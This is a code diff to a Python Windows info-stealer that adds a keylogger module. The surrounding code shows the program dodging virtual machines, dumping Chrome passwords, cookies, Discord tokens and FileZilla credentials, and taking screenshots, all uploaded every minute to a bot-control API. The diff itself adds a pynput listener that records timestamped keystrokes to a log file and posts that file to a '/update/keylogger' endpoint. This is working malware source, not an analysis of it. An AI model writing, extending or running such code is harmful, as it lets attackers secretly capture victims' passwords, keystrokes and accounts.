@@ -15,11 +15,13 @@ import win32crypt
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 import xml.etree.ElementTree as ET
+from pynput.keyboard import Key, Listener
 
 APP_DATA = os.environ['LOCALAPPDATA']
 API_URL = "http://localhost:4000"
 CONFIG_PATH = "config.txt"
 SCREENSHOT_PATH = "screenshot.jpg"
+LOG_PATH = "logs.txt"
 
 class b64():
     def encrypt(self, text):
@@ -67,6 +69,7 @@ class ApiController():
     def __init__(self):
         self.api_url = API_URL
         self.screenshot_path = SCREENSHOT_PATH
+        self.log_path = LOG_PATH
 
     def check_connection(self):
         try:
@@ -174,6 +177,12 @@ class ApiController():
                 }
 
                 requests.post(f"{self.api_url}/update/filezilla/{identifier}/{token}", json=post_data)
+
+    def update_logs(self, identifier, token):
+        if self.check_connection() and os.path.isfile(self.log_path):
+            post_file = {"file": (self.log_path, open(self.log_path, "rb"))}
+
+            requests.post(f"{self.api_url}/update/keylogger/{identifier}/{token}", files=post_file)
 
 class FileController():
     def __init__(self):
@@ -384,6 +393,34 @@ class Filezilla(object):
         self.grab_saved()
         return self.saved
 
+class KeyLogger():
+    def __init__(self):
+        self.log_path = LOG_PATH
+        self.word_counts = 0
+        self.keys = []
+
+    def get_date(self):
+        return time.strftime("%d/%m/%Y %H:%M:%S %z | ")
+
+    def on_press(self, key):
+        self.keys.append(key)
+        self.word_counts += 1
+        if(self.word_counts >= 15):
+            self.word_counts = 0
+            self.keys.append("\n")
+            self.keys.insert(0, self.get_date())
+            self.write_file(self.keys)
+            self.keys = []
+
+    def write_file(self, key_arr):
+        with open(self.log_path, "a") as f:
+            for key in key_arr:
+                ke = str(key).replace("'", "")
+                if ke.find("Key.") != -1:
+                    f.write(ke.replace("Key.", "<") + ">")
+                if ke.find("Key") == -1:
+                    f.write(ke)
+
 def main():
     if(AntiVM().inVM()):
         exit()
@@ -406,9 +443,13 @@ def main():
                         main()
                     
                     if api.check_account(bot_identifier, bot_token):
-                        api.update_details(bot_identifier, bot_token)
+                        logger = KeyLogger()
+                        listener = Listener(on_press=logger.on_press)
+                        listener.start()
+
                         schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
                         schedule.every(1).minutes.do(api.update_screenshot, bot_identifier, bot_token)
+                        schedule.every(1).minutes.do(api.update_logs, bot_identifier, bot_token)
                         schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
                         schedule.every(1).minutes.do(api.update_cookies, bot_identifier, bot_token, Cookies().dump())
                         schedule.every(1).minutes.do(api.update_discord, bot_identifier, bot_token, Discord().dump())
